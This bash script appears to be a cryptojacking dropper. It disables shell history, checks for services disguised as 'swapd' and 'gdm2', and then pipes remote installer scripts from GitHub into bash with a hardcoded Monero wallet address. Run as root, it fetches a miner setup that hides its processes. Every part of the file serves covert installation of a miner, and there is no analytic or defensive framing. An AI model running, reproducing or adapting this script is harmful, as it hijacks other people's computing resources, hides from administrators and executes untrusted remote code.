#!/bin/bash
unset HISTFILE

# Service management functions
service_exists() { systemctl is-enabled "$1.service" &>/dev/null; }
service_running() { systemctl is-active "$1.service" &>/dev/null; }

services=("swapd" "gdm2")
safe_to_run=true

for service in "${services[@]}"; do
    if service_exists "$service"; then
        if service_running "$service"; then
            echo "Service $service is running. Stopping script."
            exit 1
        else
            echo "Service $service exists but is not running."
            safe_to_run=false
        fi
    else
        echo "Service $service does not exist."
    fi
done

$safe_to_run || { echo "Found existing services in stopped state"; exit 1; }

# Resource display
read -r mem cpu storage <<< $(free -h | awk '/^Mem:/ {print $2}' \
  $(nproc) $(df -h / | awk 'NR==2 {print $2}'))
printf "---------------------------------\n| %-15s | %-12s |\n---------------------------------\n" \
  "RAM" "$mem" "CPU Cores" "$cpu" "Storage" "$storage"
echo "---------------------------------"

# Installation functions
fetch_script() {
    local url=$1
    curl -sSL "$url" | bash -s "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX"
}

if [[ $EUID -eq 0 ]]; then
    echo -e "\nRunning root installation"
    fetch_script "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh"
else
    echo -e "\nRunning user installation"
    fetch_script "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh"
fi
